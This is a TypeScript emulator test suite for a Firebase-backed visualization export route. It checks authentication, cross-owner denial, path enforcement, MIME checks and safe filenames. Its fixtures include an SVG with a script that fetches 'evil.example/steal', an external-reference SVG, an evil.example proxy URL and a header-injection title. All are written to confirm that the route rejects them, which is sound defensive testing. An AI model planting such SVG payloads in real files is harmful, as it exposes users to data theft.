/**
 * SEC-007 — end-to-end acceptance for the authenticated visualization export
 * route against the real Firebase Auth + Firestore + Storage emulators.
 *
 * This file deliberately does not match the root Jest `*.test.ts` pattern.
 * Run it through `npm run test:emulator`, which owns ephemeral Auth,
 * Firestore, and Storage emulators, seeds Firestore with Neo4j explicitly
 * disabled, and executes this file by path.
 *
 * Unlike the fully-mocked route unit test, every control here is exercised
 * against real infrastructure: a real ID token verified by the Auth emulator,
 * a real owner-scoped Storage object with real uploader metadata, and the real
 * production route handler. It proves owner success, unauthenticated and
 * cross-owner denial, object identity + bucket/path enforcement (no arbitrary
 * URL proxy), signature/MIME-mismatch rejection, raster dimension limits,
 * active/external SVG rejection, safe filenames, and the same-origin response
 * policy — end to end.
 */

import { NextRequest } from 'next/server';

import { db as adminDb } from '@/lib/firebase-admin';
import { markSuperGraphSvg } from '@/lib/super-graph/provenance';

const PROJECT_ID = 'demo-radarist';
const STORAGE_BUCKET = 'demo-radarist.appspot.com';
const AUTH_HOST = process.env.FIREBASE_AUTH_EMULATOR_HOST ?? '127.0.0.1:9099';
const STORAGE_EMULATOR_HOST = process.env.FIREBASE_STORAGE_EMULATOR_HOST ?? '127.0.0.1:9199';

if (process.env.NEXT_PUBLIC_USE_FIREBASE_EMULATOR !== 'true') {
  throw new Error('visualization-export.emulator.ts must run with NEXT_PUBLIC_USE_FIREBASE_EMULATOR=true');
}
if (process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID !== PROJECT_ID) {
  throw new Error(`visualization-export.emulator.ts requires project ${PROJECT_ID}`);
}
if (
  !process.env.FIRESTORE_EMULATOR_HOST ||
  !process.env.FIREBASE_AUTH_EMULATOR_HOST ||
  !process.env.FIREBASE_STORAGE_EMULATOR_HOST
) {
  throw new Error('Auth, Firestore, and Storage emulator hosts must be supplied by firebase emulators:exec');
}
if (process.env.NEO4J_URI) {
  throw new Error('test:emulator must keep NEO4J_URI empty');
}

// The route reads the configured bucket for the legacy-URL fallback resolver.
// The emulator project's canonical bucket is deterministic.
process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET = STORAGE_BUCKET;

// This lane owns Firebase emulators only; never auto-discover a developer's
// Inngest dev server through a transitive service import.
jest.mock('@/lib/inngest/client', () => ({
  inngest: { send: jest.fn().mockResolvedValue({ ids: ['sec007-graph-handoff'] }) },
}));
jest.mock('@/lib/inngest/send-client', () => ({
  inngest: { send: jest.fn().mockResolvedValue({ ids: ['sec007-graph-handoff'] }) },
}));

let GET: typeof import('@/app/api/visualizations/[id]/export/route').GET;
let uploadImage: typeof import('@/lib/storage').uploadImage;

const firestoreCleanup = new Set<string>();
const storageCleanup = new Set<string>();

// ── fixtures ────────────────────────────────────────────────────────────────

const ONE_PIXEL_PNG =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAAPoAAAD6AG1e1JrAAAADUlEQVR4nGNgYGBgAAAABQABpfZFQAAAAABJRU5ErkJggg==';
const ONE_PIXEL_JPEG =
  '/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AKpAB//Z';

function crc32(bytes: Uint8Array): number {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) {
      crc = (crc & 1) !== 0 ? 0xedb88320 ^ (crc >>> 1) : crc >>> 1;
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

/** A structurally valid PNG whose IHDR declares the requested dimensions. */
function validPng(width = 1, height = 1): Buffer {
  const bytes = Buffer.from(ONE_PIXEL_PNG, 'base64');
  bytes.writeUInt32BE(width, 16);
  bytes.writeUInt32BE(height, 20);
  bytes.writeUInt32BE(crc32(bytes.subarray(12, 29)), 29);
  return bytes;
}

function validJpeg(): Buffer {
  return Buffer.from(ONE_PIXEL_JPEG, 'base64');
}

/** A byte-exact renderer-provenanced, static SVG the validator accepts. */
function verifiedStaticSvg(): Buffer {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>';
  return Buffer.from(markSuperGraphSvg(svg), 'utf8');
}

function activeSvg(): Buffer {
  return Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example/steal")</script></svg>',
    'utf8'
  );
}

function externalReferenceSvg(): Buffer {
  return Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>',
    'utf8'
  );
}

// ── emulator helpers ──────────────────────────────────────────────────────────

async function signUpUser(): Promise<{ idToken: string; uid: string }> {
  const email = `sec007-${Date.now()}-${Math.random().toString(36).slice(2)}@radarist.local`;
  const response = await fetch(
    `http://${AUTH_HOST}/identitytoolkit.googleapis.com/v1/accounts:signUp?key=emulator-only-key`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password: 'sec007-password-123', returnSecureToken: true }),
    }
  );
  const body = (await response.json()) as { idToken?: string; localId?: string; error?: unknown };
  if (!response.ok || !body.idToken || !body.localId) {
    throw new Error(`Auth emulator sign-up failed (${response.status}): ${JSON.stringify(body.error ?? body)}`);
  }
  return { idToken: body.idToken, uid: body.localId };
}

/** Upload one object to a chosen owner-scoped path with explicit metadata. */
async function putObject(opts: {
  ownerUid: string;
  name: string;
  bytes: Buffer;
  contentType: string;
  uploadedBy?: string;
  contentEncoding?: string;
}): Promise<string> {
  const { getStorage } = await import('firebase-admin/storage');
  const { adminApp } = await import('@/lib/firebase-admin');
  const path = `visualizations/${opts.ownerUid}/${opts.name}`;
  const file = getStorage(adminApp).bucket(STORAGE_BUCKET).file(path);
  await file.save(opts.bytes, {
    contentType: opts.contentType,
    ...(opts.contentEncoding ? { metadata: { contentEncoding: opts.contentEncoding } } : {}),
    metadata: {
      contentType: opts.contentType,
      ...(opts.contentEncoding ? { contentEncoding: opts.contentEncoding } : {}),
      metadata: opts.uploadedBy === undefined ? {} : { uploadedBy: opts.uploadedBy },
    },
  });
  storageCleanup.add(path);
  return path;
}

interface SeedOptions {
  ownerUid: string;
  storageObjectPath?: string;
  imageUrl?: string;
  mimeType: 'image/png' | 'image/jpeg' | 'image/svg+xml';
  title?: string;
}

/** Write a visualization doc straight through the Admin SDK. */
async function seedVisualization(opts: SeedOptions): Promise<string> {
  const id = `viz-sec007-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const doc: Record<string, unknown> = {
    id,
    title: opts.title ?? 'SEC-007 acceptance infographic',
    prompt: 'seed',
    refinedPrompt: 'seed',
    imageUrl: opts.imageUrl ?? `http://${STORAGE_EMULATOR_HOST}/v0/b/${STORAGE_BUCKET}/o/placeholder`,
    mimeType: opts.mimeType,
    style: 'professional',
    dataSnapshot: { entities: [], description: 'seed' },
    createdAt: new Date().toISOString(),
    createdBy: opts.ownerUid,
    shared: false,
    userId: opts.ownerUid,
    metadata: { model: 'test', width: 1, height: 1, sizeBytes: 1 },
  };
  if (opts.storageObjectPath !== undefined) doc.storageObjectPath = opts.storageObjectPath;
  await adminDb.collection('visualizations').doc(id).set(doc);
  firestoreCleanup.add(`visualizations/${id}`);
  return id;
}

function exportRequest(id: string, token?: string): Promise<Response> {
  const headers = new Headers();
  if (token) headers.set('authorization', `Bearer ${token}`);
  const request = new NextRequest(`http://localhost/api/visualizations/${id}/export`, { headers });
  return GET(request, { params: Promise.resolve({ id }) }) as unknown as Promise<Response>;
}

/** Storage-emulator download URL for a stored object (legacy-record fallback). */
function emulatorObjectUrl(path: string): string {
  return `http://${STORAGE_EMULATOR_HOST}/v0/b/${STORAGE_BUCKET}/o/${encodeURIComponent(path)}`;
}

// ── suite ─────────────────────────────────────────────────────────────────────

beforeAll(async () => {
  GET = (await import('@/app/api/visualizations/[id]/export/route')).GET;
  uploadImage = (await import('@/lib/storage')).uploadImage;
});

afterAll(async () => {
  const { getStorage } = await import('firebase-admin/storage');
  const { adminApp } = await import('@/lib/firebase-admin');
  const bucket = getStorage(adminApp).bucket(STORAGE_BUCKET);
  await Promise.all(
    [...storageCleanup].map((path) =>
      bucket
        .file(path)
        .delete({ ignoreNotFound: true })
        .catch(() => undefined)
    )
  );
  await Promise.all(
    [...firestoreCleanup].map((path) =>
      adminDb
        .doc(path)
        .delete()
        .catch(() => undefined)
    )
  );
  await adminDb.terminate();
});

describe('SEC-007 visualization export — real Storage emulator', () => {
  it('serves the owner their exact PNG with the same-origin download policy', async () => {
    const owner = await signUpUser();
    const bytes = validPng();
    // Upload through the production helper so real uploader metadata is written.
    const url = await uploadImage(bytes, owner.uid, 'image/png', 'visualizations', `owned-${Date.now()}.png`);
    const path = new URL(url).pathname.includes('/o/')
      ? decodeURIComponent(new URL(url).pathname.split('/o/')[1].split('?')[0])
      : `visualizations/${owner.uid}/owned.png`;
    storageCleanup.add(path);
    const id = await seedVisualization({
      ownerUid: owner.uid,
      storageObjectPath: path,
      imageUrl: url,
      mimeType: 'image/png',
      title: 'Quarterly "Revenue" \n Report <script>',
    });

    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toBe('image/png');
    expect(response.headers.get('cross-origin-resource-policy')).toBe('same-origin');
    expect(response.headers.get('content-security-policy')).toBe("default-src 'none'; sandbox");
    expect(response.headers.get('x-content-type-options')).toBe('nosniff');
    expect(response.headers.get('cache-control')).toBe('private, no-store');

    // Safe filename: the title's quotes, newline, angle brackets, and other
    // header-hostile characters are collapsed to hyphens, so nothing can break
    // out of the quoted Content-Disposition value.
    const disposition = response.headers.get('content-disposition') ?? '';
    expect(disposition.startsWith('attachment; filename="')).toBe(true);
    const filename = /filename="([^"]*)"/.exec(disposition)?.[1] ?? '';
    expect(filename).toBe('Quarterly-Revenue-Report-script.png');
    expect(filename).toMatch(/^[A-Za-z0-9.-]+\.png$/);
    // The full header value carries no raw CR/LF (header-splitting) and the
    // filename token carries no quote/angle-bracket/backslash break-out chars.
    expect(disposition).not.toMatch(/[\r\n]/);
    expect(filename).not.toMatch(/["<>\\]/);

    const served = Buffer.from(await response.arrayBuffer());
    expect(served.equals(bytes)).toBe(true);
  });

  it('rejects an unauthenticated request before any Firestore or Storage read', async () => {
    const owner = await signUpUser();
    const id = await seedVisualization({
      ownerUid: owner.uid,
      storageObjectPath: `visualizations/${owner.uid}/x.png`,
      mimeType: 'image/png',
    });
    const response = await exportRequest(id);
    expect(response.status).toBe(401);
  });

  it("does not disclose or export another owner's visualization", async () => {
    const owner = await signUpUser();
    const attacker = await signUpUser();
    const url = await uploadImage(validPng(), owner.uid, 'image/png', 'visualizations', `cross-${Date.now()}.png`);
    const path = decodeURIComponent(new URL(url).pathname.split('/o/')[1].split('?')[0]);
    storageCleanup.add(path);
    const id = await seedVisualization({
      ownerUid: owner.uid,
      storageObjectPath: path,
      imageUrl: url,
      mimeType: 'image/png',
    });

    const response = await exportRequest(id, attacker.idToken);
    expect(response.status).toBe(404);
  });

  it('refuses a stored object path that is not owner-scoped (bucket/path enforcement)', async () => {
    const owner = await signUpUser();
    const attacker = await signUpUser();
    // Real bytes exist under the attacker's namespace; the owner's doc points at them.
    const url = await uploadImage(validPng(), attacker.uid, 'image/png', 'visualizations', `victim-${Date.now()}.png`);
    const foreignPath = decodeURIComponent(new URL(url).pathname.split('/o/')[1].split('?')[0]);
    storageCleanup.add(foreignPath);
    const id = await seedVisualization({
      ownerUid: owner.uid,
      storageObjectPath: foreignPath,
      imageUrl: url,
      mimeType: 'image/png',
    });

    const response = await exportRequest(id, owner.idToken);
    // The path resolver fails closed: the object is real, but it is not the
    // owner's, so export is unavailable rather than a cross-namespace read.
    expect(response.status).toBe(409);
  });

  it('is not an arbitrary URL proxy — a legacy record with an external imageUrl is refused', async () => {
    const owner = await signUpUser();
    const id = await seedVisualization({
      ownerUid: owner.uid,
      // No storageObjectPath → legacy fallback, which only resolves the
      // configured bucket + emulator origin, never an attacker-controlled host.
      imageUrl: 'https://evil.example/v0/b/demo-radarist.appspot.com/o/visualizations%2Fx%2Fy.png',
      mimeType: 'image/png',
    });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(409);
  });

  it('rejects bytes whose signature conflicts with the persisted PNG media type', async () => {
    const owner = await signUpUser();
    // Storage contentType says png (passes the metadata gate), but the bytes are
    // a JPEG — the payload validator must reject the mismatch.
    const path = await putObject({
      ownerUid: owner.uid,
      name: `sigmismatch-${Date.now()}.png`,
      bytes: validJpeg(),
      contentType: 'image/png',
      uploadedBy: owner.uid,
    });
    const id = await seedVisualization({ ownerUid: owner.uid, storageObjectPath: path, mimeType: 'image/png' });
    const response = await exportRequest(id, owner.uid ? owner.idToken : undefined);
    expect(response.status).toBe(502);
  });

  it('rejects Storage MIME metadata that conflicts with the persisted media type', async () => {
    const owner = await signUpUser();
    const path = await putObject({
      ownerUid: owner.uid,
      name: `mimemismatch-${Date.now()}.png`,
      bytes: validPng(),
      contentType: 'image/jpeg',
      uploadedBy: owner.uid,
    });
    const id = await seedVisualization({ ownerUid: owner.uid, storageObjectPath: path, mimeType: 'image/png' });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(502);
  });

  it('rejects a conflicting Storage uploader identity', async () => {
    const owner = await signUpUser();
    const path = await putObject({
      ownerUid: owner.uid,
      name: `wronguploader-${Date.now()}.png`,
      bytes: validPng(),
      contentType: 'image/png',
      uploadedBy: 'someone-else',
    });
    const id = await seedVisualization({ ownerUid: owner.uid, storageObjectPath: path, mimeType: 'image/png' });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(502);
  });

  it('rejects a raster whose declared dimensions exceed the export limit', async () => {
    const owner = await signUpUser();
    const path = await putObject({
      ownerUid: owner.uid,
      name: `huge-${Date.now()}.png`,
      bytes: validPng(20_000, 20_000),
      contentType: 'image/png',
      uploadedBy: owner.uid,
    });
    const id = await seedVisualization({ ownerUid: owner.uid, storageObjectPath: path, mimeType: 'image/png' });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(502);
  });

  it('serves a verified, static server-rendered SVG', async () => {
    const owner = await signUpUser();
    const bytes = verifiedStaticSvg();
    const path = await putObject({
      ownerUid: owner.uid,
      name: `diagram-${Date.now()}.svg`,
      bytes,
      contentType: 'image/svg+xml',
      uploadedBy: owner.uid,
    });
    const id = await seedVisualization({ ownerUid: owner.uid, storageObjectPath: path, mimeType: 'image/svg+xml' });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toBe('image/svg+xml');
    expect(Buffer.from(await response.arrayBuffer()).equals(bytes)).toBe(true);
  });

  it('rejects an active SVG (canonical record without renderer provenance)', async () => {
    const owner = await signUpUser();
    const path = await putObject({
      ownerUid: owner.uid,
      name: `active-${Date.now()}.svg`,
      bytes: activeSvg(),
      contentType: 'image/svg+xml',
      uploadedBy: owner.uid,
    });
    const id = await seedVisualization({ ownerUid: owner.uid, storageObjectPath: path, mimeType: 'image/svg+xml' });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(502);
  });

  it('accepts a safe legacy static SVG through the emulator-origin URL fallback', async () => {
    const owner = await signUpUser();
    const bytes = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect width="4" height="4"/></svg>', 'utf8');
    const path = await putObject({
      ownerUid: owner.uid,
      name: `legacy-safe-${Date.now()}.svg`,
      bytes,
      contentType: 'image/svg+xml',
      // Legacy objects predate uploader metadata.
      uploadedBy: undefined,
    });
    const id = await seedVisualization({
      ownerUid: owner.uid,
      // No storageObjectPath → legacy path (allows static SVG without provenance).
      imageUrl: emulatorObjectUrl(path),
      mimeType: 'image/svg+xml',
    });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(200);
    expect(Buffer.from(await response.arrayBuffer()).equals(bytes)).toBe(true);
  });

  it('rejects a legacy SVG that carries an external resource reference', async () => {
    const owner = await signUpUser();
    const path = await putObject({
      ownerUid: owner.uid,
      name: `legacy-active-${Date.now()}.svg`,
      bytes: externalReferenceSvg(),
      contentType: 'image/svg+xml',
      uploadedBy: undefined,
    });
    const id = await seedVisualization({
      ownerUid: owner.uid,
      imageUrl: emulatorObjectUrl(path),
      mimeType: 'image/svg+xml',
    });
    const response = await exportRequest(id, owner.idToken);
    expect(response.status).toBe(502);
  });
});
